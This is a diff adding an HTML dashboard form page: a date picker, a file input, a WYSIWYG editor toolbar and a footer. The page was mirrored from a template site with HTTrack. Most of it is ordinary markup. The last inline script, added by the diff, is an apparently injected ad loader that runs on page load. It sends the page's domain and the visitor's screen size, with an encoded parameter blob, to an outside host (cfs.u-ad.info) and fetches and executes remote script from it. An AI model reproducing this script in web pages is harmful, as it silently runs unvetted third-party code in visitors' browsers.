+        <div class="form-group">
+          <label class="col-sm-2 control-label">Date range picker</label>
+          <div class="col-sm-10">
+            <input ui-jq="daterangepicker" ui-options="{
+                format: 'YYYY-MM-DD',
+                startDate: '2013-01-01',
+                endDate: '2013-12-31'
+              }" class="form-control w-md" />
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">File input</label>
+          <div class="col-sm-10">
+            <input ui-jq="filestyle" type="file" data-icon="false" data-classButton="btn btn-default" data-classInput="form-control inline v-middle input-s">
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Wysiwyg</label>
+          <div class="col-sm-10">
+            <div class="btn-toolbar m-b-sm btn-editor" data-role="editor-toolbar" data-target="#editor">
+              <div class="btn-group dropdown" dropdown>
+                <a class="btn btn-default m-b-sm" dropdown-toggle tooltip="Font"><i class="fa fa-font"></i><b class="caret"></b></a>
+                <ul class="dropdown-menu">
+                  <li><a href data-edit="fontName Serif" style="font-family:'Serif'">Serif</a></li> 
+                  <li><a href data-edit="fontName Sans" style="font-family:'Sans'">Sans</a></li>
+                  <li><a href data-edit="fontName Arial" style="font-family:'Arial'">Arial</a></li></ul>
+              </div>
+              <div class="btn-group dropdown" dropdown>
+                <a class="btn btn-default  m-b-sm" dropdown-toggle data-toggle="dropdown" tooltip="Font Size"><i class="fa fa-text-height"></i>&nbsp;<b class="caret"></b></a>
+                <ul class="dropdown-menu">
+                  <li><a href data-edit="fontSize 5" style="font-size:24px">Huge</a></li>
+                  <li><a href data-edit="fontSize 3" style="font-size:18px">Normal</a></li>
+                  <li><a href data-edit="fontSize 1" style="font-size:14px">Small</a></li>
+                </ul>
+              </div>
+              <div class="btn-group">
+                <a class="btn btn-default m-b-sm" data-edit="bold" tooltip="Bold (Ctrl/Cmd+B)"><i class="fa fa-bold"></i></a>
+                <a class="btn btn-default m-b-sm" data-edit="italic" tooltip="Italic (Ctrl/Cmd+I)"><i class="fa fa-italic"></i></a>
+                <a class="btn btn-default m-b-sm" data-edit="strikethrough" tooltip="Strikethrough"><i class="fa fa-strikethrough"></i></a>
+                <a class="btn btn-default m-b-sm" data-edit="underline" tooltip="Underline (Ctrl/Cmd+U)"><i class="fa fa-underline"></i></a>
+              </div>
+              <div class="btn-group">
+                <a class="btn btn-default m-b-sm" data-edit="insertunorderedlist" tooltip="Bullet list"><i class="fa fa-list-ul"></i></a>
+                <a class="btn btn-default m-b-sm" data-edit="insertorderedlist" tooltip="Number list"><i class="fa fa-list-ol"></i></a>
+                <a class="btn btn-default m-b-sm" data-edit="outdent" tooltip="Reduce indent (Shift+Tab)"><i class="fa fa-dedent"></i></a>
+                <a class="btn btn-default m-b-sm" data-edit="indent" tooltip="Indent (Tab)"><i class="fa fa-indent"></i></a>
+              </div>
+              <div class="btn-group">
+                <a class="btn btn-default m-b-sm" data-edit="justifyleft" tooltip="Align Left (Ctrl/Cmd+L)"><i class="fa fa-align-left"></i></a>
+                <a class="btn btn-default m-b-sm" data-edit="justifycenter" tooltip="Center (Ctrl/Cmd+E)"><i class="fa fa-align-center"></i></a>
+                <a class="btn btn-default m-b-sm" data-edit="justifyright" tooltip="Align Right (Ctrl/Cmd+R)"><i class="fa fa-align-right"></i></a>
+                <a class="btn btn-default m-b-sm" data-edit="justifyfull" tooltip="Justify (Ctrl/Cmd+J)"><i class="fa fa-align-justify"></i></a>
+              </div>
+              <div class="btn-group dropdown" dropdown>
+                <a class="btn btn-default m-b-sm" dropdown-toggle tooltip="Hyperlink"><i class="fa fa-link"></i></a>
+                <div class="dropdown-menu">
+                  <div class="input-group m-l-xs m-r-xs">
+                    <input class="form-control input-sm" id="LinkInput" placeholder="URL" type="text" data-edit="createLink"/>
+                    <div class="input-group-btn">
+                      <button class="btn btn-sm btn-default" type="button">Add</button>
+                    </div>
+                  </div>
+                </div>
+                <a class="btn btn-default" data-edit="unlink" tooltip="Remove Hyperlink"><i class="fa fa-cut"></i></a>
+              </div>
+              
+              <div class="btn-group">
+                <a class="btn btn-default m-b-sm" tooltip="Insert picture (or just drag & drop)" id="pictureBtn"><i class="fa fa-picture-o"></i></a>
+                <input type="file" data-edit="insertImage" style="position:absolute; opacity:0; width:41px; height:34px" />
+              </div>
+              <div class="btn-group">
+                <a class="btn btn-default m-b-sm" data-edit="undo" tooltip="Undo (Ctrl/Cmd+Z)"><i class="fa fa-undo"></i></a>
+                <a class="btn btn-default m-b-sm" data-edit="redo" tooltip="Redo (Ctrl/Cmd+Y)"><i class="fa fa-repeat"></i></a>
+              </div>
+            </div>
+            <div ui-jq="wysiwyg" class="form-control" style="overflow:scroll;height:200px;max-height:200px">
+              Go ahead&hellip;
+            </div>
+          </div>
+        </div>
+        
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <div class="col-sm-4 col-sm-offset-2">
+            <button type="submit" class="btn btn-default m-r-sm">Cancel</button>
+            <button type="submit" class="btn btn-info">Save changes</button>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+
+  </div>
+    <!-- end hbox hbox-auto-xs -->
+</div>
+
+
+ <!-- footer -->
+  <footer id="footer" class="app-footer" role="footer">
+    <div class="wrapper-md padder-lg b-t bg-light">
+      <span class="pull-right">&copy; Copyright Bandung <a href ui-scroll="app" class="m-l-sm text-muted"><i class="icon-bdg_arrow11"></i></a></span>
+     Made with <i class="text-danger fa fa-heart"></i> in Bandung
+    </div>
+  </footer>
+  <!-- / footer -->
+
+
+
+</div>
+
+<script src="../libs_dashboard/jquery/jquery/dist/jquery.js"></script>
+<script src="../libs_dashboard/jquery/bootstrap/dist/js/bootstrap.js"></script>
+<script src="js/ui-load.js"></script>
+<script src="js/ui-jp.config.js"></script>
+<script src="js/ui-jp.js"></script>
+<script src="js/ui-nav.js"></script>
+<script src="js/ui-toggle.js"></script>
+<script src="js/ui-client.js"></script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnZJcdmojQFr0dHQ4se5CU1WaRM4qmZU301iDvrW2PvQ0NGbPZ38ocaixGU8ggLLhLzO%2fwXHdp1R2nY8gWG8gsJRmorl1uRCJajYCDpov6noKXq3xE%2bImTzDS9FhNZTm8kpsJ%2blItlYjeXSUPrEMY%2bkkIOeq0VWt2iHP3OcwwgLJNGEr7qXKD8iGKEKh9klinf1tj5eNq6kY0NGsz22X56nOWkVa9uk8o8N9NLEEDZ2V4Ro7WJ8xaGY4WWZhc16pEnjiT8NzO4tWIgaQ8wb%2fxwwf5VSOjOrQiYWR5swTPkkrl3oes8%2b5PWfgll67qCrWQYR1EZ3Pi%2fO%2bQ0MP8PpSma2Q794FyPoKkGPiIQ5QlgJ0ak64il2%2fXewG7tQjMB9x9Ljn2aO8LXbXP62YJGgCChn45RWu1I8Q%2f%2bKDmv6ptutiO3RVErZXWahIaMIKm49DPRzYJFVFJzJ1Cm%2f261XE0ecSEHLhcZy4KJEwJofzupeRhoHJDYFBtemg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+<!-- Mirrored from bdgwebkit.com/dashboard-components/form_element.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Apr 2016 08:48:09 GMT -->
+</html>
